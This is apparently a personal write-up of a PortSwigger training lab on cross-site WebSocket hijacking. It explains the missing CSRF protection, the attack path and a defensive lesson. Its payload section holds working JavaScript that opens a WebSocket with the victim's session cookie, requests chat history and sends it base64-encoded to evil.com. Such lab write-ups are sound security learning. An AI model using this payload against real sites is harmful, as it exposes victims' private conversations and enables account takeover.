# [Cross-site WebSocket hijacking] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-10
 
---
 
## Vulnerability / core concept
Cross-site WebSocket hijacking

## What made me stuck
This level was pretty easy and straightforward. The concept was easy and by using AI to create me a valid payload I solved this lab pretty easy.
 
## What unblocked me
`null`
 
---


## Attack path
1) When intercepting and analyzing this lab, we can notice that application does not have csrf token and validates live chat only based on session cookie. This screams csrf attack.
2) Now, all we need to do is to create a malicious link that we will send to the victim. This link will open websocket session in vulnerable app and it will use victim's session cookie. After that we send `READY` message to the server (in portswigger this message retrieves chat history) and then we send all chat history to external server so we can access and read it.
3) All left to do is to read chat and find password for victim and log in into their account to solve the lab.

---


## Payload / key command
```html
<!DOCTYPE html>
<html>
<body>
  <script>
    // Attacker's malicious page hosted on evil.com
    // When victim visits this page, their browser automatically
    // sends their session cookie to the target WebSocket server

    var ws = new WebSocket('wss://vulnerable-site.com/chat');

    ws.onopen = function() {
        // Connection established using victim's session cookie
        // Server thinks this is the legitimate user
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        // Attacker reads everything server sends back
        // Could be chat history, account info, etc.
        fetch('https://evil.com/steal?data=' + btoa(event.data));
    };
  </script>
</body>
</html>
```
This is the payload I created after understand websocket connection flow. As you can see here, victim's browser is forced to open new websocket connection with the server, sends `READY` message to retrieve chat history and send all this history to our exploit server in base64 encoded form. Base64 encoded form prevents chat history from breaking our URI. Now, all we need to do is to decode each message and find sensitive data from there.

---


## What I'd recognize faster next time
It is important to include csrf token and do not rely on session cookie alone to prevent csrf attacks. As we can see from this lab, opening malicious page can give attacker two-directional access to chat history which may contain very sensitive data of victim.
 

